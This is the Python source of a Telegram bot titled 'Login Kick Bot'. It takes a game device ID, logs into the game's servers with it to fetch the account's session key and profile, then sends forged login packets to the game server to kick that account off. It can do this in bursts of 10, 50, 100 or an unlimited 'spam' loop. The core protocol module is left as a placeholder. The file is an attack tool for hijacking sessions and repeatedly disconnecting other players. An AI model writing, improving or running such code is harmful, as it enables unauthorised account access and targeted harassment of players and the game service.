#!/usr/bin/env python3
import asyncio
import logging
import os
import socket
import time
from typing import Any, Dict, Optional, Tuple

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ================== PASTE YOUR CORE HERE ==================
# from your_module import (
#     GameLogin, GameConnection, SdpStruct, map_rank,
#     CLIENT_VERSION, CHANNEL
# )
# import zstd   # or zstandard as zstd
# ==========================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ALLOWED_USERS = set()  # e.g. {123456789} or leave empty for everyone

WAITING_DEVICE = 1
active_jobs: Dict[int, bool] = {}

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


# ---------- your original functions (keep exact) ----------
def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone:
        return None
    try:
        conn = GameConnection(device_id=device_id)
        if not conn.login_to_login_server():
            return None
        if not conn.get_game_server() or not conn.connect_to_game_server():
            return None
        sess_key = conn.session_key
        gs_host = conn.game_host
        gs_port = conn.game_port
        creation_ts = conn.creation_ts
        skin_info = conn.get_skin_role_info(acc, zone) if hasattr(conn, 'get_skin_role_info') else {}
        ban_stat = conn.check_ban_status() if hasattr(conn, 'check_ban_status') else "NORMAL"
        conn.cleanup()
        skin_info = skin_info if isinstance(skin_info, dict) else {}
        nick = skin_info.get(2) or f"Player_{acc}"
        level = skin_info.get(3) or 1
        skin_cnt = skin_info.get(10) if (skin_info and skin_info.get(10) is not None) else 0
        hero_cnt = skin_info.get(9) if (skin_info and skin_info.get(9) is not None) else 0
        cur_rank_val = skin_info.get(6, 0) or 0
        max_rank_val = skin_info.get(15, 0) or cur_rank_val
        return {
            'device_id': device_id,
            'account_id': acc,
            'session_key': sess_key,
            'zone_id': zone,
            'creation_ts': creation_ts,
            'game_host': gs_host,
            'game_port': gs_port,
            'gs_info': f"{gs_host}:{gs_port}",
            'nickname': nick,
            'level': level,
            'rank': map_rank(cur_rank_val),
            'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
            'skin_count': skin_cnt,
            'hero_count': hero_cnt,
            'ban_status': ban_stat,
        }
    except:
        return None


def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0 = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))
        body_struct = SdpStruct({
            0: profile['account_id'],
            1: profile['session_key'],
            2: profile['zone_id'],
            4: CLIENT_VERSION,
            13: CHANNEL,
            15: profile['device_id']
        }).data
        pkt = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)
        q = b''
        got_ack = False
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            if len(q) >= sz:
                got_ack = True
        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, str(e)
# ----------------------------------------------------------


def profile_text(data: Dict[str, Any]) -> str:
    ban = str(data.get('ban_status', 'NORMAL'))
    ban_disp = ban if 'ban' in ban.lower() else "NORMAL (Clean)"
    return (
        f"📋 <b>ACCOUNT PROFILE</b>\n"
        f"────────────────────\n"
        f"👤 <b>ID</b> : <code>{data['account_id']}</code>\n"
        f"🏷 <b>Nick</b> : {data['nickname']}\n"
        f"📍 <b>Zone</b> : {data['zone_id']}\n"
        f"🎚 <b>Level</b> : {data['level']}\n"
        f"🏆 <b>Rank</b> : {data['rank']}\n"
        f"🌟 <b>Highest</b> : {data['highest_rank']}\n"
        f"🎨 <b>Skin/Hero</b> : {data['skin_count']} / {data['hero_count']}\n"
        f"🌐 <b>Server</b> : <code>{data['gs_info']}</code>\n"
        f"⚡ <b>Status</b> : {ban_disp}"
    )


def mode_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🧪 Single", callback_data="m1")],
        [InlineKeyboardButton("⚡ 10x", callback_data="m2"),
         InlineKeyboardButton("🚀 50x", callback_data="m3")],
        [InlineKeyboardButton("💥 100x", callback_data="m4"),
         InlineKeyboardButton("♾️ Unlimited", callback_data="m5")],
        [InlineKeyboardButton("🛠️ Custom", callback_data="m6")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
    ])


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("Access denied.")
        return ConversationHandler.END
    await update.message.reply_text(
        "⚡ <b>Login Kick Bot</b>\n\nSend Device ID\n/stop to cancel spam",
        parse_mode="HTML"
    )
    return WAITING_DEVICE


async def receive_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    device_id = update.message.text.strip()
    msg = await update.message.reply_text("🔍 Checking...")
    loop = asyncio.get_event_loop()
    profile = await loop.run_in_executor(None, fetch_session_profile, device_id)
    if not profile:
        await msg.edit_text("❌ Invalid / failed Device ID")
        return ConversationHandler.END
    context.user_data["profile"] = profile
    await msg.edit_text(profile_text(profile), parse_mode="HTML", reply_markup=mode_kb())
    return ConversationHandler.END


async def mode_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    profile = context.user_data.get("profile")
    if not profile:
        await q.edit_message_text("Expired. /start again")
        return
    if q.data == "cancel":
        await q.edit_message_text("Cancelled.")
        return
    if q.data == "m1":
        await q.edit_message_text("Sending single kick...")
        loop = asyncio.get_event_loop()
        ok, lat, desc = await loop.run_in_executor(None, send_session_kick, profile)
        txt = f"✅ {desc} | {lat:.0f}ms" if ok else f"❌ {desc} | {lat:.0f}ms"
        await q.edit_message_text(txt)
        return
    presets = {"m2": (10, 2.0), "m3": (50, 1.0), "m4": (100, 0.5), "m5": (0, 0.0)}
    if q.data in presets:
        total, delay = presets[q.data]
        await q.edit_message_text(f"⚡ Starting {total or '∞'} kicks...")
        asyncio.create_task(run_spam(q.message, context, profile, total, delay))
        return
    if q.data == "m6":
        context.user_data["custom"] = True
        await q.edit_message_text("Send: <code>loops delay</code>\nExample: <code>30 1.2</code>", parse_mode="HTML")


async def custom_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("custom"):
        return
    context.user_data["custom"] = False
    try:
        parts = update.message.text.split()
        total = int(parts[0])
        delay = float(parts[1]) if len(parts) > 1 else 2.0
    except:
        await update.message.reply_text("Format: loops delay")
        return
    profile = context.user_data.get("profile")
    if not profile:
        await update.message.reply_text("Expired. /start")
        return
    msg = await update.message.reply_text("Starting custom...")
    asyncio.create_task(run_spam(msg, context, profile, total, delay))


async def run_spam(message, context, profile, total, delay):
    chat_id = message.chat_id
    active_jobs[chat_id] = False
    count = success = fail = 0
    lats = []
    t0 = time.time()
    status = await message.reply_text("Running...")
    try:
        while True:
            if active_jobs.get(chat_id, True):
                break
            count += 1
            loop = asyncio.get_event_loop()
            ok, lat, _ = await loop.run_in_executor(None, send_session_kick, profile)
            lats.append(lat)
            success += 1 if ok else 0
            fail += 0 if ok else 1
            if count % 5 == 0 or (total and count >= total):
                avg = sum(lats)/len(lats) if lats else 0
                try:
                    await status.edit_text(
                        f"⚡ {count}{'/'+str(total) if total else '/∞'}\n"
                        f"✅ {success}  ❌ {fail}\nAvg {avg:.0f}ms"
                    )
                except: pass
            if total and count >= total:
                break
            if delay > 0:
                await asyncio.sleep(delay)
    except Exception as e:
        logger.exception(e)
    dur = time.time() - t0
    avg = sum(lats)/len(lats) if lats else 0
    pct = success/count*100 if count else 0
    await status.edit_text(
        f"📊 <b>DONE</b>\n"
        f"{profile['nickname']} (<code>{profile['account_id']}</code>)\n"
        f"⏱ {dur/60:.1f}m | {count} loops\n"
        f"✅ {success} ({pct:.1f}%)  ❌ {fail}\n"
        f"⚡ {avg:.0f}ms avg",
        parse_mode="HTML"
    )
    active_jobs.pop(chat_id, None)


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    if cid in active_jobs:
        active_jobs[cid] = True
        await update.message.reply_text("⏹ Stopping...")
    else:
        await update.message.reply_text("No job running.")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END


def main():
    if not BOT_TOKEN:
        raise SystemExit("Set BOT_TOKEN env var")
    app = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={WAITING_DEVICE: [MessageHandler(filters.TEXT & \~filters.COMMAND, receive_device)]},
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(mode_cb))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, custom_msg))
    app.add_handler(CommandHandler("stop", stop))
    print("Bot started on Railway")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
